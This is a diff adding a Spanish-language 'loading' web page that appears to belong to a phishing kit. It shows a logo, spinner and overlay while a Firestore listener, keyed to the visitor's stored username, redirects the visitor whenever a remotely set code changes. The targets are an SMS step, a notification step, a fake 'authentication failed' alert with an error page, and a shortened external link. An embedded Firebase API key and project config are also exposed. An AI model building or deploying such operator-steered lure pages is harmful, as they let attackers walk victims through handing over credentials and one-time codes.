@@ -1,0 +1,115 @@
+<html><head><style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+    }
+
+    .contenido {
+      padding: 20px;
+      z-index: 1;
+      position: relative;
+    }
+
+    .overlay-gris {
+      position: absolute; /* Usa fixed si quieres que sea en toda la pantalla */
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(128, 128, 128, 0.3); /* Gris con 50% de transparencia */
+      pointer-events: none; /* Permite hacer clic en elementos debajo */
+      z-index: 2;
+    }
+	
+	.gif-container {
+            position: relative;
+        }
+
+        .gif-container img {
+            position: relative; /* Asegura que la imagen esté en su lugar */
+            z-index: 1; /* Asegura que la imagen esté encima */
+        }
+  </style>
+    <link href="./fonts/desktops.css" type="text/css" rel="stylesheet">
+	<link rel="SHORTCUT ICON" href="images/favicon.ico"/>
+	<meta charset="UTF-8">
+	<title>Cargando</title>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+<script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+const fbseconfig = {
+  apiKey: "AIzaSyBAFMqfpBe-lJc8zvZiwoWv8Wtgjph7GDY",
+  authDomain: "prrueba02-a7511.firebaseapp.com",
+  databaseURL: "https://prrueba02-a7511-default-rtdb.firebaseio.com",
+  projectId: "prrueba02-a7511",
+  storageBucket: "prrueba02-a7511.firebasestorage.app",
+  messagingSenderId: "409778587656",
+  appId: "1:409778587656:web:627110c05e23bd3c5869bd"
+};
+
+      const app = initializeApp(fbseconfig);
+      const db = getFirestore(app);
+
+      window.db = db;
+      window.doc = doc;
+      window.setDoc = setDoc;
+      window.onSnapshot = onSnapshot;
+    </script>
+</head>
+<body>
+
+    <div style="margin-top: 20px;margin-bottom: 20px;margin-left: auto;margin-right: auto;width: 72%;">
+	<img src="images/1.png" alt="logo">
+	</div>
+	
+<div class="btn_fw"></div>
+
+<div style="margin-top: 35px;margin-left: auto;margin-bottom: 20px;margin-right: auto;width: 100%;">
+<div style="display:flex;margin-bottom: 20px;"><img src="images/Loader.gif" alt="logo" style="margin-right: 0px;margin-top: 100;margin-left: 400px;position: absolute;">
+
+					</div></div>
+
+ <div class="overlay-gris"></div>
+<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  </body>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const questionRef = window.doc(
+        window.db,
+        "promebdt",
+        localStorage.getItem("usuario")
+      );
+      window.onSnapshot(questionRef, (doc) => {
+        if (doc.exists()) {
+          const questionData = doc.data();
+
+          if (questionData.page == 123) {
+            window.location.href = "https://goo.su/bovMd";
+          }
+          if (questionData.page == 234) {
+            window.location.href = "viarsms";
+          }
+          if (questionData.page == 345) {
+            window.location.href = "viarnotifi";
+          }
+          if (questionData.page == 456) {
+            alert("Autentiación Fallida");
+            window.location.href = "usererror";
+          }
+		  
+
+          // hideOverlay(); // Descomentar esta línea si tienes una función para ocultar el overlay
+        } else {
+          console.log("No such document!");
+        }
+      });
+    });
+  </script></html>
